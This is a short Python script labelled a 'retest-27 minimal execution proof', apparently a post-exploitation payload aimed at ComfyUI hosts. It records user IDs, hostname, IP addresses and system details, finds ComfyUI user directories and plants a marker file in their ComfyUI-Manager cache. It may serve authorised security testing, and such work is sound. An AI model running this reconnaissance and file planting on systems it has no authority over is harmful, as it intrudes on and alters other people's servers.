#!/usr/bin/env python3
# retest-27 minimal execution proof: no miner, no persistence writes
import glob, os, subprocess, time

def cap(cmd):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        return p.stdout.strip().replace("\n", " ")
    except Exception as e:
        return "ERR:%s" % e

def main():
    proof = ("=== RETEST27 %s uid=%d euid=%d host=%s ip=%s nproc=%s cwd=%s\nuname=%s\n"
             % (time.strftime("%FT%TZ", time.gmtime()), os.getuid(), os.geteuid(),
                cap(["hostname"]), cap(["hostname", "-I"]), os.cpu_count(), os.getcwd(),
                cap(["uname", "-a"])))
    print(proof, flush=True)
    dirs = ["/ComfyUI/user/default"]
    for g in ("/work", "/app", "/opt", "/root", "/home", "/data", "/srv"):
        dirs += glob.glob(g + "/*/user/default")
    for d in dict.fromkeys(dirs):
        if not os.path.isdir(d):
            continue
        p = os.path.join(d, "ComfyUI-Manager", "cache")
        os.makedirs(p, exist_ok=True)
        with open(os.path.join(p, "retest27_plant.txt"), "a") as fh:
            fh.write(proof)
        print("wrote", os.path.join(p, "retest27_plant.txt"), flush=True)

if __name__ == "__main__":
    main()
